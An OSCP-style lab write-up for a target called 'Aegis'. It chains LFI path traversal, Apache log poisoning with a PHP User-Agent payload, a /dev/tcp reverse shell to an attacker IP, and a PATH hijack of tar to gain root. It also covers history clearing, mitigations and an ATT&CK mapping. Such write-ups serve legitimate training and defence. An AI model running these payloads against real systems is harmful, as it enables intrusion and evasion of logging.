---
title: "Aegis (OSCP-style): LFI → Log Poisoning → RCE → PATH Hijack → root"
date: 2025-08-22
categories: [writeup]
tags: [lfi, rce, php, apache, privilege-escalation, path-hijack, oscp]
---

> ⚠️ Educational note: Perform this only on **authorized** lab targets.

## TL;DR
- Open ports: `22/tcp` (OpenSSH 8.x), `80/tcp` (Apache 2.4 + PHP).
- File download endpoint vulnerable to **LFI** → read **Apache access.log**.
- Inject PHP into `User-Agent` (**log poisoning**) → include via LFI → **RCE** as `www-data`.
- A backup script run with elevated privileges calls `tar` **without absolute path** → **PATH hijack** → `root`.

---


## Target & Scope
- Host: `10.10.10.50` (lab)
- OS: Linux x86_64 (Apache + PHP)
- In scope: ports 22, 80
- Objective: stable shell → root; low noise; clear evidence

---

## 1) Recon

### 1.1 Port scan
```shell-session
# All ports (fast)
nmap -Pn -T4 -p- --min-rate 3000 10.10.10.50 -oA scans/allports

# Service/version + default scripts
nmap -Pn -T4 -sV -sC -p22,80 10.10.10.50 -oA scans/target
```

**Findings**
- `22/tcp`: OpenSSH 8.x
- `80/tcp`: Apache 2.4.x, PHP enabled

### 1.2 Web enumeration
```shell-session
whatweb http://10.10.10.50/
curl -I http://10.10.10.50/
```
UI exposes a **download** endpoint:
```
GET /download?file=<name>
```

Bruteforce content & parameters:
```shell-session
ffuf -u http://10.10.10.50/FUZZ \
     -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -fc 404
```

---

## 2) LFI (Local File Inclusion)

Attempt path traversal on the download parameter:
```shell-session
curl 'http://10.10.10.50/download?file=../../../../etc/passwd'
```

If `/etc/passwd` content is returned, LFI confirmed:
```
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

**Next**: try reading web server logs for **log poisoning**.

---

## 3) Log Poisoning → RCE

### 3.1 Locate logs (Debian/Ubuntu defaults)
- `/var/log/apache2/access.log`
- `/var/log/apache2/error.log`
- or vhost logs: `/var/log/apache2/<site>-access.log`

Verify readable via LFI:
```shell-session
curl 'http://10.10.10.50/download?file=../../../../var/log/apache2/access.log' | head
```

### 3.2 Inject PHP via `User-Agent`
```shell-session
# Write PHP into the log via User-Agent
curl -A '<?php echo "PWNED-".(21+21)."-END"; ?>' http://10.10.10.50/

# Then include the log file through the LFI to execute it
curl 'http://10.10.10.50/download?file=../../../../var/log/apache2/access.log'
# Expect to see: PWNED-42-END
```

### 3.3 Reverse shell
Attacker listener:
```shell-session
nc -lvnp 4444
```

Trigger (exec via poisoned log):
```shell-session
curl -G 'http://10.10.10.50/download' \
  --data-urlencode 'file=../../../../var/log/apache2/access.log' \
  -A '<?php system("/bin/bash -c \"/bin/bash -i >& /dev/tcp/10.10.14.20/4444 0>&1\""); ?>'
```

Stabilize TTY:
```shell-session
script -qc /bin/bash /dev/null
stty raw -echo; fg
reset
export TERM=xterm-256color
```

---

## 4) Post-exploitation (as `www-data`)

Quick local enum:
```shell-session
id; uname -a
sudo -l
find / -perm -4000 -type f 2>/dev/null | sort
ls -al /var/www/html
grep -R "DB_PASS\|DB_USER" /var/www/html 2>/dev/null
```

Found:
- `/var/www/html/backup.sh` (readable) called by a timer or root-owned service.
- The script calls `tar` **without absolute path**.
- `sudo -l` might show privileges on the backup routine (optional).

---

## 5) Privilege Escalation — PATH Hijack

**Idea**: If a privileged script runs `tar` without `/usr/bin/tar`, we can put a fake `tar` earlier in `PATH`.

Create rogue binary:
```shell-session
cd /tmp
cat > tar <<'EOF'
#!/bin/bash
/bin/bash -p
EOF
chmod +x tar
```

Prepend `/tmp` to PATH:
```shell-session
export PATH=/tmp:$PATH
```

Trigger the backup routine (one of the following):
```shell-session
# If you can call it directly (example)
sudo /bin/bash /var/www/html/backup.sh

# If it's a systemd timer/service, wait for it or try (examples may vary)
systemctl list-timers --all 2>/dev/null
```

If successful:
```shell-session
root@aegis:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
```

---

## 6) Cleanup
```shell-session
rm -f /tmp/tar
history -c 2>/dev/null || true
```
Validate that no persistent changes or files were left behind.

---

## 7) Mitigations
- Apply strict allow-lists & canonicalization on file parameters; **never trust user input** for filesystem reads.
- Prevent execution in log/upload dirs (e.g., Apache/PHP: `php_admin_value engine Off` or separate vhost).
- Remove log exposure via the app; logs should not be web-reachable.
- In privileged scripts, use **absolute paths** for all binaries (`/usr/bin/tar`), and drop `NOPASSWD` where not strictly necessary.
- Monitor for suspicious `User-Agent` patterns (PHP tags, reverse shell strings).
- Principle of least privilege for services and scheduled tasks.

---

## 8) ATT&CK Mapping (high-level)
| Phase | Technique | ID |
|---|---|---|
| Initial Access | Exploit Public-Facing App (LFI → RCE) | T1190 |
| Execution | Command & Scripting Interpreter | T1059 |
| Privilege Escalation | Hijack Execution Flow: PATH | T1574.007 |
| Defense Evasion | Obfuscated/Hidden Artifacts (log tampering) | T1070 |
| Discovery | System/Service Discovery | T1082/T1007 |

---

## Appendix

### Useful one-liners
```bash
# TTY upgrade (bash/pty)
python3 -c 'import pty,os; pty.spawn("/bin/bash")'; stty raw -echo; fg
```

```bash
# SUID sweep
find / -perm -4000 -type f 2>/dev/null
```

```bash
# Simple ffuf LFI fuzz
ffuf -u 'http://TARGET/download?file=FUZZ' \
     -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt \
     -mr 'root:x:0:0'
```

---
